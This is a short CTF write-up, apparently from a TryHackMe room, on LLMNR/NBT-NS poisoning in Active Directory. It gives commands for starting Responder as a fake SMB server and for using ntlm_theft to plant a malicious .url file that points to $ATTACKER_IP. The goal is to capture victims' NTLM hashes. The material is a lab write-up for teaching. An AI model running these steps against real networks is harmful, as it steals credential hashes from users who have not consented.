#AD_LLMNR-NBT-NS_Poisoning

LLMNR/NBT-NS These are old Windows features used when a computer can't find another one by name.

### <span style="color:#50FA7B">Example:</span>

Your Windows tries to access a shared folder `\\fileserver\share`But if it **can’t find "fileserver"**, it asks:

> [!quote] Broadcast Request
> "Hey network, who is fileserver?"

Anyone on the network can reply...

So you can use a tool like **Responder** to Trick a user into connecting to our fake server and say:

> [!quote] Fake Responder Reply
> "I’m fileserver! Send me your login info!"

Windows believes you and sends you Username and NTLM hash

**Scenario:** In a THM CTF room called **Reset**, I connected to the SMB share **Data** using guest login. I found a folder named **“onboarding”** and noticed that the filenames were changing every few seconds. I assumed there must be an automated process running that modifies these files frequently. Because of this, I decided to try using LLMNR/NBT-NS attacks.

### <span style="color:#50FA7B">Step 1: Start Responder</span>

```bash
sudo responder -I tun0
```

- Runs a fake SMB server on your machine
- Waits to catch login attempts

### <span style="color:#50FA7B">Step 2: Upload Malicious `.url` File</span>

Using [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) to create a malicious `.url` file.

```bash
python3 ntlm_theft.py -g url -s $ATTACKER_IP -f shell
```

- `.url` file points to your IP (`\\$ATTACKER_IP\share`)
- When automatic script opens it, Windows tries to connect to you

### <span style="color:#50FA7B">Step 3: Capture the Hash</span>

- Victim’s machine sends their **NTLM hash** to your fake server

**NOTE:** This is another scenario involving LLMNR poisoning. For this attack to work, there must be network traffic generated when a user searches for a name that cannot be resolved. Your machine listens for these requests and responds as the fake server, tricking the user’s computer into connecting to you.
